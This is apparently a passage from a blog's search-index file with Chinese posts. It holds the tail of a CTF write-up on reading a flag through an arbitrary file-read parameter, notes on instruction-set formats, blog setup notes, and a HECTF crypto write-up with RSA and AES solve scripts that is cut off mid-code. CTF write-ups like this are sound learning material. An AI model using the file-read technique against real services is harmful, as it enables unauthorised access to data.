然后发现看到其他人上传的照片全部显示出来了</p><p>这引起一丝警觉</p><p>然后对代码进行审查</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206221703254.png" alt="image-20231206221703254"></p><p>找到这个路由</p><p>参数是<code>file</code></p><p>对file指定的文件进行读取</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206221803040.png" alt="image-20231206221803040"></p><p>然后我们又在dockerfile中看到flag文件的位置</p><p>读！</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206221906877.png" alt="image-20231206221906877"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-contest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【计组学习笔记】第四章——指令系统</title>
      <link href="/2023/11/23/2023-11-22-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/11/23/2023-11-22-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="4-1-指令系统：">4.1 指令系统：</h1><p>​       指令：又称<strong>机器指令</strong>，是指示计算机执行某种操作的命令，是计算机运行的最小功能单位。</p><p>指令集：一台计算机的所有指令的集合构成该机的<strong>指令系统</strong></p><p>指令系统（指令集）是指令集体系结构（ISA）中最核心的部分</p><h2 id="4-1-1-指令的基本格式">4.1.1 指令的基本格式</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700735562097-07f8460f-776a-48bc-8ce5-f9c50a5d51c0.png" alt="img"></p><ul><li><p>操作码：指明做了什么动作</p></li><li><ul><li>作用1：执行什么性质的操作，具有何种功能</li><li>作用2：识别指令、了解指令功能、区分操作数地址内容的组成和使用方法</li><li>举例：停机中断、求反求补、加减乘除</li></ul></li><li><p>地址码：指明对谁动手脚</p></li><li><ul><li>不需要操作对象</li><li>需要一个操作对象</li><li>需要两个操作对象</li><li>特性：</li></ul></li><li><ul><li><ul><li>n位地址码的直接寻址范围=<img src="https://cdn.nlark.com/yuque/__latex/055ce37910d06a8239ef5a1ee87765f5.svg" alt="img"></li><li>若指令总长度固定不变，则地址码数量越多，寻址能力越差</li></ul></li></ul></li><li><p>指令的长度：一条指令中所包含的二进制代码的位数</p></li><li><ul><li>指令字长取决于：</li></ul></li><li><ul><li><ul><li>操作码的长度</li><li>操作数<strong>地址码</strong>的长度</li><li>操作数<strong>地址</strong>的个数</li></ul></li></ul></li><li><ul><li>指令长度和机器字长无固定关系，但是可以进行分类：</li></ul></li><li><ul><li><ul><li>单字长指令：指令长度等于机器字长的指令</li><li>半字长指令：指令长度等于半个机器字长的指令</li><li>双字长指令：指令长度等于两个机器字长的指令</li></ul></li></ul></li><li><p>指令字长</p></li></ul><p>一条指令的总长度（可能会变）</p><ul><li>机器字长</li></ul><p>CPU进行一次整数运算所能处理的二进制数据的位数（通常和ALU相关）</p><ul><li>存储字长</li></ul><p>一个存储单元中的二进制代码位数（通常和MDR位数相同）</p><h3 id="整体框架">整体框架</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700529939609-9f254304-23dc-4a9a-9d61-80949cf2c2cf.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700530803938-6d4044e8-5482-4e7e-b826-8bb40a6b0cf7.png" alt="img"></p><p><strong>解释一下：</strong></p><p><strong>MAR</strong>：地址寄存器 存放预访问的存储单元的地址，其位数对应存储单元的个数</p><p><strong>MDR</strong>：数据寄存器 存放从存储体某单元取出的代码</p><h3 id="1-零地址指令">1. 零地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700737333811-b69655d1-5b3c-492d-9f21-8f7924ec2c13.png" alt="img"></p><p>只给出操作码OP，没有显式地址。有两种可能：</p><p>(1) 不需要操作数的指令，如空操作，停机，关中断等指令</p><p>(2) 零地址的运算类指令仅用在堆栈计算机中，两个操作数隐含存放在栈顶和次栈顶弹出，送到运算器进行运算，计算结果隐含的压回栈顶 类似“后缀表达式”</p><h3 id="2-一地址指令">2. 一地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700528843600-4834a977-6e70-4c86-93b5-cec8be702aaa.png" alt="img"></p><p>其中</p><p><strong>ACC</strong>：Accumulator累加器，是运算器中既能存放运算前的操作数，又能存放运算结果的寄存器</p><p><strong>ALU</strong>：算数逻辑单元，可以进行算术运算（加减乘除）逻辑运算（与或非异或）辅助功能（移位求补）</p><p>对于寻址范围做出解释：</p><p>指令字长为32为，操作码占8位，1个地址码字段占24位，则指令操作数的直接寻址范围为<img src="https://cdn.nlark.com/yuque/__latex/15d04819c5dddc99711267e7e27f0f98.svg" alt="img">bit</p><p>进行单位换算为<img src="https://cdn.nlark.com/yuque/__latex/872f8e29a949503f528e4a65325b996e.svg" alt="img">* <img src="https://cdn.nlark.com/yuque/__latex/64636e8771ef215128139253c19e840a.svg" alt="img">位 = 16 M</p><h3 id="3-二地址指令">3. 二地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700527387652-2cf386f0-ff1e-4f7f-ac75-92bf857bee0f.png" alt="img"></p><p>其中目的操作数保存本次的运算结果</p><p>对于寻址范围做出解释：</p><p>指令字长为32为，操作码占8位，两个地址码字段各占12位，则指令操作数的直接寻址范围为<img src="https://cdn.nlark.com/yuque/__latex/15cd115f2a18cc8842ed3d8dc9d5372e.svg" alt="img">bit</p><p>进行单位换算为<img src="https://cdn.nlark.com/yuque/__latex/47a0f3528006ad0757aa3a00b3fd6f5e.svg" alt="img">* <img src="https://cdn.nlark.com/yuque/__latex/f21b0a508bad7e226d4eebcb732edd1a.svg" alt="img">位 = 4 K</p><h3 id="4-三地址指令">4. 三地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700529808503-fc9a6875-4ce1-427e-97cd-0ca5f0c1b972.png" alt="img"></p><h3 id="5-四地址指令">5. 四地址指令</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35630100/1700529860336-14105e7b-4bb1-4e34-92b0-0551537b255b.png" alt="img"></p><p>特殊点：</p><p>正常情况下取指令之后PC+1，指向下一条指令</p><p>四指令地址：取执行指令后，将PC的值修改为<img src="https://cdn.nlark.com/yuque/__latex/e639cfa67e1a86f2b6223153524439bc.svg" alt="img">（下址）所指地址</p><h2 id="4-1-2-定长操作码指令格式">4.1.2 定长操作码指令格式</h2><p><strong>定长操作码</strong>指令在指令的最高部分分配若干位（定长）表示操作码。</p><p>一般n位操作码字段的指令系统最大能表示<img src="https://cdn.nlark.com/yuque/__latex/055ce37910d06a8239ef5a1ee87765f5.svg" alt="img">条指令</p><h2 id="4-1-3-扩展操作码指令格式">4.1.3 扩展操作码指令格式</h2><h3 id="目的：">目的：</h3><p>在指令字长有限的前提下保持比较丰富的指令种类，可采用<strong>可变长度操作码</strong>，即全部指令的操作码字段的位数不固定，且分散地放在指令字的不同位置上。</p><h3 id="实现方式：">实现方式：</h3><p>定长指令字结构+可变长操作码 -&gt; 扩展操作码指令格式</p><p><strong>扩展操作码</strong> 使操作码的长度随地址码的减少而增加，不同地址数的指令可具有不同长度的操作码，从而在满足需要的前提下有效缩短指令字长</p><h2 id="4-1-4-指令分类-按操作类型分类">4.1.4 指令分类（按操作类型分类）</h2><h3 id="1-数据传送-数据传送类：进行主存和cpu之间的数据传送">1. 数据传送（数据传送类：进行主存和CPU之间的数据传送）</h3><ol><li><ol><li>LOAD：从内存单元读取数据到CPU寄存器（LOAD）</li><li>STORE：把CPU寄存器写数据到内存单元（STORE）</li><li>MOV：传输指令通常由寄存器之间的传送（MOV）</li></ol></li></ol><h3 id="2-运算类">2. 运算类</h3><p>算数与逻辑运算：</p><blockquote><p>ADD：加</p><p>SUB：减</p><p>CMP：比较</p><p>MUL：乘</p><p>DIV：除</p><p>INC：加1</p><p>DEC：减1</p><p>AND：与</p><p>OR：或</p><p>NOT：取反</p><p>XOR：异或</p></blockquote><h3 id="3-移位操作">3. 移位操作</h3><ol><li>算数移位</li><li>逻辑移位</li><li>循环移位</li></ol><h3 id="4-转移操作">4. 转移操作</h3><blockquote><p>JMP：无条件转移</p><p>BRANCH：条件转移</p><p>CALL：调用</p><p>RET：返回</p><p>TRAP：陷阱</p></blockquote><p>区分：</p><ul><li><p><strong>无条件转移指令</strong>在任何情况下都执行转移操作</p></li><li><p><strong>条件转移指令</strong>仅在特定条件满足时才执行转移操作，其中转移条件一般是某个标志位的值，或几个标志位的组合</p></li><li><p>执行<strong>调用指令</strong>是必须保存下一条指令的地址（返回地址），当子程序执行结束时，根据返回地址返回到主程序继续执行</p></li><li><p><strong>转移指令</strong>则不返回执行</p></li></ul><h3 id="5-输入输出类">5. 输入输出类</h3><p>CPU与外部设备</p>]]></content>
      
      
      <categories>
          
          <category> computer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建记录</title>
      <link href="/2023/11/22/2023-11-22-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/11/22/2023-11-22-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="博客搭建记录">博客搭建记录</h1><p>今天终于也算是完成了基于hexo框架 butterfly主题的博客搭建<br>在这过程中收获很多<br>对于git、npm的使用和理解也更多了</p><hr><p>目前整体的使用流程就是在本地写好md文件放到post中<br>然后在本地blog文件夹中打开<code>git bash</code><br>常用的只有三种命令</p><ul><li><code>hexo g</code></li><li><code>hexo d</code> 远程推送</li><li><code>hexo s</code> 本地查看</li></ul><hr><p>在搭建过程中也遇到很多问题，将看到的博客记录下：</p><ul><li><a href="https://www.wzhecnu.cn/2021/07/22/blog/hexo-02-zhu-ti-mei-hua/">设置分类和标签</a></li><li><a href="https://hj24.life/posts/%E8%A7%A3%E5%86%B3hexo%E5%8D%9A%E5%AE%A2%E4%B8%8D%E8%83%BD%E6%98%BE%E7%A4%BA%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98/">外部图床无法引用问题</a></li><li><a href="https://blog.csdn.net/cj461733387/article/details/124548828">法二</a></li></ul><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231122015855865.png" alt="image-20231122015855865"></p><ul><li><p><a href="https://zhuanlan.zhihu.com/p/655349835">上传过慢，配置ssh</a></p></li><li><p><a href="https://blog.csdn.net/mjh1667002013/article/details/129290903">效果美化</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> computer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023HECTF</title>
      <link href="/2023/11/21/2023-11-18-HECTF/"/>
      <url>/2023/11/21/2023-11-18-HECTF/</url>
      
        <content type="html"><![CDATA[<h1 id="2023hectf">2023HECTF</h1><h2 id="crypto">Crypto</h2><h3 id="rsarsa-solved">rsarsa|(solved）</h3><h4 id="考点：rsa-公式分解">考点：rsa 公式分解</h4><h4 id="解题：">解题：</h4><p>原题:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from functools import reduce</span></span><br><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># from secret import flag,hint</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def generate_PQ(bits):</span></span><br><span class="line"><span class="comment">#     x = getPrime(bits) &gt;&gt; bits//2 &lt;&lt; bits//2</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         p = x + random.getrandbits(bits//2)</span></span><br><span class="line"><span class="comment">#         if isPrime(p):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         q = x + random.getrandbits(bits//2)</span></span><br><span class="line"><span class="comment">#         if isPrime(q):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#     return p,q</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m = bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># hint = bytes_to_long(hint)</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># p,q = generate_PQ(1024)</span></span><br><span class="line"><span class="comment"># n = p*q</span></span><br><span class="line">seed = <span class="number">256087</span>+<span class="number">396445</span>-<span class="number">538018</span></span><br><span class="line">random.seed(seed)    <span class="comment">#只要seed确定 后面生成的数就相同</span></span><br><span class="line">x = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]  <span class="comment">#只生成两个数</span></span><br><span class="line">y = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="comment"># print(&quot;c =&quot;,pow(hint,e,n))</span></span><br><span class="line"><span class="comment"># print(&quot;n =&quot;,n)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[30509, 13601]</span></span><br><span class="line"><span class="comment">#[92095, 27065]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c1 = (30509*m + 13601)^17 % n </span></span><br><span class="line"><span class="comment"># c2 = (92095*m + 27065)^17 % n</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;c1 =&quot;,pow(reduce(lambda x, y: x * m + y, x), 17, n))</span></span><br><span class="line"><span class="comment"># #解释一下这段公式</span></span><br><span class="line"><span class="comment"># #reduce函数存在两个参数 第一个是式子 第二个是对应的操作值</span></span><br><span class="line"><span class="comment"># #比如一个x=[2,3,4] 那么lambda表达式会每次在x中取两个值 并且将运算的结果累计到下一个x 然后y向后取一个数                                      </span></span><br><span class="line"><span class="comment"># print(&quot;c2 =&quot;,pow(reduce(lambda x, y: x * m + y, y), 17, n))</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">23001012057110779471190091625946693776382380529397302126337301229214301450335125076016991835054198112255974220434689958104931664098817350134656616154892781885504255726632558690544057380195511404078662094726952602350250840712610362029824982069179543810686494204685887486972937880502875441232004432323308734978847464589775857815430854038396134952486665687531579988133729365443247597395131516449487146786214227230853061720614077115599878358089377114269765796099004940883513036567103436154122335792598432012140232905658895014924069330265282364249236142072335363164451294973492092043110680377767954710822286121195290921259</span></span><br><span class="line">n = <span class="number">25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241</span></span><br><span class="line">c1 = <span class="number">5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313</span></span><br><span class="line">c2 = <span class="number">17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(c1,c2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = pow(x,17,n)</span></span><br><span class="line">p = <span class="number">160616239660727858899273379103592231155409056274229284184975467127574269595624091311175627078626817259122507024363284463167205592226280887239280008933792076628602313168161987456794466948371108388445589568660803435612911564349113520700334500717237521981464112146232603304167030094761289132103178741978484324163</span></span><br><span class="line">q = <span class="number">160616239660727858899273379103592231155409056274229284184975467127574269595624091311175627078626817259122507024363284463167205592226280887239280008933792069345408116962980054711105579607903079344180647686753187313507576711078157922258567830351506693970326314484271008164343339287427523462030830749467794546707</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment">#b&#x27;Hint&#123;Seed_is_256087_+_396445_-_538018&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>其中一些解题的经过也放在里面了</p><p>该题主要是两部分组成</p><p>首先是根据p和q的生成方式 两数非常接近</p><p>所以通过yafu本地即可以分解n</p><p>然后利用n分解的p和q 成功获得hint提示</p><p>提示告诉了我们种子是什么</p><p>在生成随机数的时候：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(seed)    <span class="comment">#只要seed确定 后面生成的数就相同</span></span><br><span class="line">x = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]  <span class="comment">#只生成两个数</span></span><br><span class="line">y = [random.randint(<span class="number">1</span>,seed) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br></pre></td></tr></table></figure><p>随机数生成器由种子决定 所以是伪随机</p><p>当种子seed确定之后 后面两个值的生成是完全固定的</p><p>所以算出种子 本地跑一下就可以获得x和y的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[30509, 13601]</span></span><br><span class="line"><span class="comment">#[92095, 27065]</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241</span></span><br><span class="line">c1 = <span class="number">5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313</span></span><br><span class="line">c2 = <span class="number">17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c1 = (30509*m + 13601)^17 % n </span></span><br><span class="line"><span class="comment"># c2 = (92095*m + 27065)^17 % n</span></span><br></pre></td></tr></table></figure><p>目前卡在最后一步</p><p>已知c1和c2 和n 如何求出m</p><p>=&gt; 相关明文攻击</p><p><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">脚本来源</a></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119230808324.png" alt="image-20231119230808324"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本1</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, n, e</span>):</span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="comment"># replace a,b,c,d</span></span><br><span class="line">    a = <span class="number">30509</span> </span><br><span class="line">    b = <span class="number">13601</span></span><br><span class="line">    c = <span class="number">92095</span></span><br><span class="line">    d = <span class="number">27065</span></span><br><span class="line">    g1 = (a*x+b)^e - c1</span><br><span class="line">    g2 = (c*x+d)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">n = <span class="number">25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241</span></span><br><span class="line">c1 = <span class="number">5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313</span></span><br><span class="line">c2 = <span class="number">17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">m1 = attack(c1, c2, n, e)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="string">&quot;%x&quot;</span> % <span class="built_in">int</span>(m1)))</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m1)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;HECTF&#123;r3411y_easy_R4nd0m_And_r3l4ted_m3554ge_att4ck&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="我们仨-solved">我们仨|(solved)</h3><h4 id="考点：aes-异或-多素数rsa解密-des">考点：AES 异或 多素数rsa解密 DES</h4><h4 id="解题：">解题：</h4><p>三层套娃：</p><p>第一关：</p><p>与NewStarWeek1非常一模一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># from flag import flag</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">b&quot;&quot;</span>.join([<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_program</span>():</span><br><span class="line">    secret_data = padding(flag)</span><br><span class="line">    secret_key = os.urandom(<span class="number">16</span>) * <span class="number">2</span></span><br><span class="line">    init_vector = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(secret_key) ^ bytes_to_long(init_vector) ^ <span class="number">1</span>)</span><br><span class="line">    cipher = AES.new(secret_key, AES.MODE_CBC, init_vector)</span><br><span class="line">    encrypted_flag = cipher.encrypt(secret_data)</span><br><span class="line">    <span class="built_in">print</span>(encrypted_flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="comment">#     execute_program()</span></span><br><span class="line"></span><br><span class="line">data = <span class="number">113271863767201424639329153097952947311122854394813183532903131317262533549675</span></span><br><span class="line">c = <span class="string">b&#x27;_1\x16\xc2;\xb1\xddy\x14\xdd\x14\xe5&#123;\x19\x04:&#x27;</span></span><br><span class="line">data = data ^ <span class="number">1</span></span><br><span class="line">key = long_to_bytes(data)[:<span class="number">16</span>] * <span class="number">2</span></span><br><span class="line">iv = bytes_to_long(key) ^ data</span><br><span class="line">iv = long_to_bytes(iv) </span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">dec_flag = aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(dec_flag)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>第二关：</p><p>直接分解n</p><p>获得一系列小素数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 